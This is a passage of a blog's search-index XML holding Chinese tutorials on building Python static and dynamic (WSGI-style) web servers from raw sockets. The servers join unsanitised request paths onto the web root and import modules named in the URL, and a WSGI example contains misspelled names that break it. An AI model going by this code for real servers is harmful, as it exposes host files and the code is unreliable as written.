class="params">(self)</span>:</span></span><br><span class="line">        self.server_socket.listen(<span class="number">128</span>)</span><br><span class="line">        <span class="string">"""多进程处理请求"""</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            client_socket, client_address = self.server_socket.accept()</span><br><span class="line">            print(<span class="string">"[%s,%s]用户连接上了"</span> % client_address)</span><br><span class="line">            handle_client_process = Process(target=self.handle_client, args=(client_socket,))</span><br><span class="line">            handle_client_process.start()</span><br><span class="line">            client_socket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_client</span><span class="params">(self,client_socket)</span>:</span></span><br><span class="line">        <span class="string">"""处理客户端请求"""</span></span><br><span class="line">        <span class="comment"># 获取客户端数据</span></span><br><span class="line">        request_data = client_socket.recv(<span class="number">2048</span>)</span><br><span class="line">        print(<span class="string">"request data:"</span>,request_data)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 处理请求数据</span></span><br><span class="line">        request_lines = request_data.splitlines()</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> request_lines:</span><br><span class="line">            print(line)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># "GET / HTTP/1.1"</span></span><br><span class="line">        request_start_line = request_lines[<span class="number">0</span>]</span><br><span class="line">        file_name = re.match(<span class="string">r"\w+ +(/[^ ]*)"</span>,request_start_line.decode(<span class="string">"utf-8"</span>)).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"/"</span> == file_name:</span><br><span class="line">            file_name= <span class="string">"/index.html"</span></span><br><span class="line">        <span class="comment"># 打开文件</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            file = open(HTML_ROOT_DIR+file_name,<span class="string">"rb"</span>)</span><br><span class="line">        <span class="keyword">except</span> IOError:</span><br><span class="line">            <span class="comment"># 构造响应数据</span></span><br><span class="line">            response_start_line = <span class="string">"HTTP/1.1 404 Not Found\r\n"</span></span><br><span class="line">            response_headers = <span class="string">"Server: My testserver\r\n"</span></span><br><span class="line">            response_body = <span class="string">"file is not found!"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            file_data = file.read()</span><br><span class="line">            file.close()</span><br><span class="line">            <span class="comment"># 构造响应数据</span></span><br><span class="line">            response_start_line = <span class="string">"HTTP/1.1 200 0k\r\n"</span></span><br><span class="line">            response_headers = <span class="string">"Server: My testserver\r\n"</span></span><br><span class="line">            response_body = file_data.decode(<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        response = response_start_line + response_headers+ <span class="string">"\r\n"</span>+ response_body</span><br><span class="line">        print(<span class="string">"response:"</span>,response)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 向客户端发送数据</span></span><br><span class="line">        client_socket.send(bytes(response,<span class="string">"utf-8"</span>))</span><br><span class="line">        <span class="comment"># 关闭客户端连接</span></span><br><span class="line">        client_socket.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bind</span><span class="params">(self,port)</span>:</span></span><br><span class="line">        self.server_socket.bind((<span class="string">""</span>, port))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    http_server = HTTPserver()</span><br><span class="line">    http_server.bind(<span class="number">8000</span>)</span><br><span class="line">    http_server.start()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> Web服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【python-Web服务器】1.5 python-Web动态服务器-1</title>
      <link href="2020/04/08/1.5%20python-Web%E5%8A%A8%E6%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8-1/"/>
      <url>2020/04/08/1.5%20python-Web%E5%8A%A8%E6%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8-1/</url>
      
        <content type="html"><![CDATA[<h2 id="本文主要内容"><a href="#本文主要内容" class="headerlink" title="本文主要内容"></a>本文主要内容</h2><ul><li>服务器动态资源请求相关知识（WSGI）</li><li>python实现Web动态服务器示例</li></ul><a id="more"></a><h2 id="0x01-服务器动态资源请求"><a href="#0x01-服务器动态资源请求" class="headerlink" title="0x01 服务器动态资源请求"></a>0x01 服务器动态资源请求</h2><h3 id="1-1-浏览器请求动态页面过程"><a href="#1-1-浏览器请求动态页面过程" class="headerlink" title="1.1 浏览器请求动态页面过程"></a>1.1 浏览器请求动态页面过程</h3><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20408web01.png" alt=""></p><h3 id="1-2-WSGI"><a href="#1-2-WSGI" class="headerlink" title="1.2 WSGI"></a>1.2 WSGI</h3><blockquote><p>Web服务器网关接口（Python Web Server Gateway Interface，缩写为WSGI）是为Python语言定义的Web服务器和Web应用程序或框架之间的一种简单而通用的接口</p></blockquote><p>怎么在你刚建立的Web服务器上运⾏⼀个Django应用和Flask应用，如何不做任何改变而适应不同的web架构呢？</p><p>在以前，选择Python web架构会受制于可用的web服务器    ，反之亦然。 如果架构和服务器可以协同⼯作，那就好了：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20408web02.png" alt=""></p><p>但有可能面对（或者曾有过）下⾯的问题，当要把⼀个服务器和⼀个架构结合起来时，却发现他们不是被设计成协同⼯作的：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20408web03.png" alt=""></p><p>那么，怎么可以不修改服务器和架构代码⽽确保可以在多个架构下运⾏web 服务器呢？答案就是Python    Web    Server    Gateway    Interface    (或简称 WSGI，读作“wizgy”)。</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20408web04.png" alt=""></p><ul><li>WSGI允许开发者将选择web框架和web服务器分开。可以混合匹配web服务 器和web框架，选择⼀个适合的配对。⽐如,可以在Gunicorn或者 Nginx/uWSGI    或者Waitress上运⾏Django,Flask,或    Pyramid。真正的混合 匹配，得益于WSGI同时⽀持服务器和架构：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20408web05.png" alt=""></li></ul><p>web服务器必须具备WSGI接⼝，所有的现代Python  Web框架都已具备WSGI接口，它让你不对代码作修改就能使服务器和特点的web框架协同⼯作。<br>WSGI由web服务器支持，⽽web框架允许你选择适合自己的配对，但它同样对于服务器和框架开发者提供便利使他们可以专注于自己偏爱的领域和专长 而不至于相互牵制。其他语言也有类似接⼝：java有Servlet    API，Ruby有 Rack。</p><h3 id="1-3-定义WSGI接口"><a href="#1-3-定义WSGI接口" class="headerlink" title="1.3 定义WSGI接口"></a>1.3 定义WSGI接口</h3><p>WSGI接⼝定义⾮常简单，它只要求Web开发者实现⼀个函数，就可以响应 HTTP请求。我们来看⼀个最简单的Web版本的“Hello    World!”：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">apllication</span><span class="params">(environ, start_response)</span>:</span></span><br><span class="line">    start_reponse(<span class="string">'200 ok'</span>,[(<span class="string">'Content-Type'</span>,<span class="string">'text/html'</span>)])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello World!'</span></span><br></pre></td></tr></table></figure><p>上⾯的pplication()函数就是符合WSGI标准的⼀个HTTP处理函数，它接收两个参数：</p><ul><li>environ：一个包含所有HTTP请求信息的dict对象</li><li>start_response：一个发送HTTP响应的函数</li></ul><p>整个application()函数本身没有涉及到任何解析HTTP的部分，也就是说，把底层web服务器解析部分和应用程序逻辑部分进行了分离，这样开发者就可以专⼼做⼀个领域了</p><p>不过，这个application()函数怎么调用？如果我们自己调用，两个参数environ和start_response我们没法提供，返回的str也没法发给浏览器。</p><p>所以application()函数必须由WSGI服务器来调用。有很多符合WSGI规范的服务器。而我们此时的web服务器项目的目的就是做一个可以解析静态网页还可以解析动态网页的服务器</p><h2 id="0x02-python-Web动态服务器示例"><a href="#0x02-python-Web动态服务器示例" class="headerlink" title="0x02 python-Web动态服务器示例"></a>0x02 python-Web动态服务器示例</h2><h3 id="2-1-本地Pycharm布置目录"><a href="#2-1-本地Pycharm布置目录" class="headerlink" title="2.1 本地Pycharm布置目录"></a>2.1 本地Pycharm布置目录</h3><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20408web06.png" alt=""></p><h3 id="2-2-web服务器代码（04-dynamic-web-server-py）"><a href="#2-2-web服务器代码（04-dynamic-web-server-py）" class="headerlink" title="2.2 web服务器代码（04_dynamic_web_server.py）"></a>2.2 web服务器代码（04_dynamic_web_server.py）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置静态文件根目录</span></span><br><span class="line">HTML_ROOT_DIR = <span class="string">"./html"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置动态执行文件目录</span></span><br><span class="line">WSGI_PYTHON_DIR = <span class="string">"./wsgipython"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HTTPserver</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""init"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.server_socket.listen(<span class="number">128</span>)</span><br><span class="line">        <span class="string">"""多进程处理请求"""</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            client_socket, client_address = self.server_socket.accept()</span><br><span class="line">            print(<span class="string">"[%s,%s]用户连接上了"</span> % client_address)</span><br><span class="line">            handle_client_process = Process(target=self.handle_client, args=(client_socket,))</span><br><span class="line">            handle_client_process.start()</span><br><span class="line">            client_socket.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start_response</span><span class="params">(self,status,headers)</span>:</span></span><br><span class="line">        <span class="comment"># 分析： start_response 处理响应的状态码和头部信息</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">           status = "200 OK"</span></span><br><span class="line"><span class="string">      headers = [</span></span><br><span class="line"><span class="string">          ("Content-Type", "text/plain")</span></span><br><span class="line"><span class="string">      ]</span></span><br><span class="line"><span class="string">      star</span></span><br><span class="line"><span class="string">          """</span></span><br><span class="line">        response_headers = <span class="string">"HTTP/1.1 "</span>+ status + <span class="string">"\r\n"</span></span><br><span class="line">        <span class="keyword">for</span> header <span class="keyword">in</span> headers:</span><br><span class="line">            response_headers += <span class="string">"%s: %s\r\n"</span> % header</span><br><span class="line">        self.response_headers = response_headers</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_client</span><span class="params">(self, client_socket)</span>:</span></span><br><span class="line">        <span class="string">"""处理客户端请求"""</span></span><br><span class="line">        <span class="comment"># 获取客户端数据</span></span><br><span class="line">        request_data = client_socket.recv(<span class="number">2048</span>)</span><br><span class="line">        print(<span class="string">"request data:"</span>,request_data)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 处理请求数据</span></span><br><span class="line">        request_lines = request_data.splitlines()</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> request_lines:</span><br><span class="line">            print(line)</span><br><span class="line">        <span class="comment"># 解析请求报文</span></span><br><span class="line">        <span class="comment"># "GET / HTTP/1.1"</span></span><br><span class="line">        request_start_line = request_lines[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 提取用户请求的文件名</span></span><br><span class="line">        file_name = re.match(<span class="string">r"\w+ +(/[^ ]*)"</span>,request_start_line.decode(<span class="string">"utf-8"</span>)).group(<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># 提取用户请求的方法</span></span><br><span class="line">        method = re.match(<span class="string">r"(\w+) +/[^ ]* "</span>, request_start_line.decode(<span class="string">"utf-8"</span>)).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># "/ctime.py"</span></span><br><span class="line">        <span class="comment"># "/sayhello.py"</span></span><br><span class="line">        <span class="comment"># 判断是否为动态资源请求</span></span><br><span class="line">        <span class="keyword">if</span> file_name.endswith(<span class="string">".py"</span>):</span><br><span class="line">            <span class="comment"># try使用提升容错率：也即访问的资源不存在时给出提示</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># __import__魔术方法，导入已经创建的py模块，类似import</span></span><br><span class="line">                <span class="comment"># m这里以模块使用</span></span><br><span class="line">                m = __import__(file_name[<span class="number">1</span>:<span class="number">-3</span>])</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="comment"># 使用self.response_headers为服务器添加属性</span></span><br><span class="line">                self.response_headers = <span class="string">"HTTP/1.1 404 Not Found\r\n"</span></span><br><span class="line">                response_body= <span class="string">"not found"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 字典表示请求的相关信息</span></span><br><span class="line">                env = &#123;</span><br><span class="line">                    <span class="string">"PATH_INFO"</span>:file_name,</span><br><span class="line">                    <span class="string">"METHOD"</span>:method</span><br><span class="line">                &#125;</span><br><span class="line">                response_body = m.application(env,self.start_response)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># response 服务器响应浏览器请求的数据</span></span><br><span class="line">            response = self.response_headers+ <span class="string">"\r\n"</span> + response_body</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"/"</span> == file_name:</span><br><span class="line">                file_name= <span class="string">"/index.html"</span></span><br><span class="line">            <span class="comment"># 打开文件</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                file = open(HTML_ROOT_DIR+file_name,<span class="string">"rb"</span>)</span><br><span class="line">            <span class="keyword">except</span> IOError:</span><br><span class="line">                <span class="comment"># 构造响应数据</span></span><br><span class="line">                response_start_line = <span class="string">"HTTP/1.1 404 Not Found\r\n"</span></span><br><span class="line">                response_headers = <span class="string">"Server: My testserver\r\n"</span></span><br><span class="line">                response_body = <span class="string">"file is not found!"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                file_data = file.read()</span><br><span class="line">                file.close()</span><br><span class="line">                <span class="comment"># 构造响应数据</span></span><br><span class="line">                response_start_line = <span class="string">"HTTP/1.1 200 0k\r\n"</span></span><br><span class="line">                response_headers = <span class="string">"Server: My testserver\r\n"</span></span><br><span class="line">                response_body = file_data.decode(<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            response = response_start_line + response_headers+ <span class="string">"\r\n"</span>+ response_body</span><br><span class="line">            print(<span class="string">"response:"</span>,response)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 向客户端发送数据</span></span><br><span class="line">        client_socket.send(bytes(response,<span class="string">"utf-8"</span>))</span><br><span class="line">        <span class="comment"># 关闭客户端连接</span></span><br><span class="line">        client_socket.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bind</span><span class="params">(self,port)</span>:</span></span><br><span class="line">        self.server_socket.bind((<span class="string">""</span>, port))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 利用sys模块导入路径</span></span><br><span class="line">    sys.path.insert(<span class="number">1</span>, WSGI_PYTHON_DIR)</span><br><span class="line">    http_server = HTTPserver()</span><br><span class="line">    http_server.bind(<span class="number">8000</span>)</span><br><span class="line">    http_server.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="2-3-动态执行脚本（ctime-py）代码："><a href="#2-3-动态执行脚本（ctime-py）代码：" class="headerlink" title="2.3 动态执行脚本（ctime.py）代码："></a>2.3 动态执行脚本（ctime.py）代码：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># "/ctime.py?timezone=e8"</span></span><br><span class="line"><span class="comment"># "/ctime.py?timezone=e1"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">application</span><span class="params">(env, start_response)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># env.get("Method")</span></span><br><span class="line">    <span class="comment"># env.get("PATH_INFO")</span></span><br><span class="line">    <span class="comment"># env.get("QUERY_STRING")</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    分析1：env保存的是http的请求，apllication 函数利用env相关信息进行处理</span></span><br><span class="line"><span class="string">    分析2： 浏览器动态请求的页面，再次通过服务器响应至浏览器端，状态码，和头部信息需在apllication中处理</span></span><br><span class="line"><span class="string">    分析3：start_response函数用来处理响应的状态status和响应头headers返回至dynamic_web_server服务器</span></span><br><span class="line"><span class="string">    分析4：return 返回内容，也即是响应体response_body内容</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    status = <span class="string">"200 OK"</span></span><br><span class="line">    headers = [</span><br><span class="line">        (<span class="string">"Content-Type"</span>, <span class="string">"text/plain"</span>)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    start_response(status, headers)</span><br><span class="line">    <span class="keyword">return</span> time.ctime()</span><br></pre></td></tr></table></figure><h3 id="2-4-执行流程图"><a href="#2-4-执行流程图" class="headerlink" title="2.4 执行流程图"></a>2.4 执行流程图</h3><ul><li>大概画了一下<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20408web08.png" alt=""></li></ul><h3 id="2-5-测试"><a href="#2-5-测试" class="headerlink" title="2.5 测试"></a>2.5 测试</h3><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20408web07.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> Web服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【python-Web服务器】1.3 python-Web静态服务器-2-显示需要的页面</title>
      <link href="2020/04/06/1.3%20python-Web%E9%9D%99%E6%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8-2-%E6%98%BE%E7%A4%BA%E9%9C%80%E8%A6%81%E7%9A%84%E9%A1%B5%E9%9D%A2/"/>
      <url>2020/04/06/1.3%20python-Web%E9%9D%99%E6%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8-2-%E6%98%BE%E7%A4%BA%E9%9C%80%E8%A6%81%E7%9A%84%E9%A1%B5%E9%9D%A2/</url>
      
        <content type="html"><![CDATA[<p>本文使用python写个可以显示需要页面的Web静态服务器。</p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">HTML_ROOT_DIR = <span class="string">"./html"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_client</span><span class="params">(client_socket)</span>:</span></span><br><span class="line">    <span class="string">"""处理客户端请求"""</span></span><br><span class="line">    <span class="comment"># 获取客户端数据</span></span><br><span class="line">    request_data = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">    print(<span class="string">"request data:"</span>,request_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 处理请求数据</span></span><br><span class="line">    request_lines = request_data.splitlines()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> request_lines:</span><br><span class="line">        print(line)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># "GET / HTTP/1.1"</span></span><br><span class="line">    request_start_line = request_lines[<span class="number">0</span>]</span><br><span class="line">    file_name = re.match(<span class="string">r"\w+ +(/[^ ]*)"</span>,request_start_line.decode(<span class="string">"utf-8"</span>)).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"/"</span> == file_name:</span><br><span class="line">        file_name= <span class="string">"/index.html"</span></span><br><span class="line">    <span class="comment"># 打开文件</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        file = open(HTML_ROOT_DIR+file_name,<span class="string">"rb"</span>)</span><br><span class="line">    <span class="keyword">except</span> IOError:</span><br><span class="line">        <span class="comment"># 构造响应数据</span></span><br><span class="line">        response_start_line = <span class="string">"HTTP/1.1 404 Not Found\r\n"</span></span><br><span class="line">        response_headers = <span class="string">"Server: My testserver\r\n"</span></span><br><span class="line">        response_body = <span class="string">"file is not found!"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        file_data = file.read()</span><br><span class="line">        file.close()</span><br><span class="line">        <span class="comment"># 构造响应数据</span></span><br><span class="line">        response_start_line = <span class="string">"HTTP/1.1 200 0k\r\n"</span></span><br><span class="line">        response_headers = <span class="string">"Server: My testserver\r\n"</span></span><br><span class="line">        response_body = file_data.decode(<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    response = response_start_line + response_headers+ <span class="string">"\r\n"</span>+ response_body</span><br><span class="line">    print(<span class="string">"response:"</span>,response)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 向客户端发送数据</span></span><br><span class="line">    client_socket.send(bytes(response,<span class="string">"utf-8"</span>))</span><br><span class="line">    <span class="comment"># 关闭客户端连接</span></span><br><span class="line">    client_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    server_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    server_socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,<span class="number">1</span>)</span><br><span class="line">    server_socket.bind((<span class="string">""</span>,<span class="number">8000</span>))</span><br><span class="line">    server_socket.listen(<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        client_socket, client_address = server_socket.accept()</span><br><span class="line">        print(<span class="string">"[%s,%s]用户连接上了"</span>%client_address)</span><br><span class="line">        handle_client_process = Process(target=handle_client, args=(client_socket,))</span><br><span class="line">        handle_client_process.start()</span><br><span class="line">        client_socket.close()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> Web服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【python-Web服务器】1.2 python-Web静态服务器-1-显示固定的页面</title>
      <link href="2020/04/06/1.2%20python-Web%E9%9D%99%E6%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8-1-%E6%98%BE%E7%A4%BA%E5%9B%BA%E5%AE%9A%E7%9A%84%E9%A1%B5%E9%9D%A2/"/>
      <url>2020/04/06/1.2%20python-Web%E9%9D%99%E6%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8-1-%E6%98%BE%E7%A4%BA%E5%9B%BA%E5%AE%9A%E7%9A%84%E9%A1%B5%E9%9D%A2/</url>
      
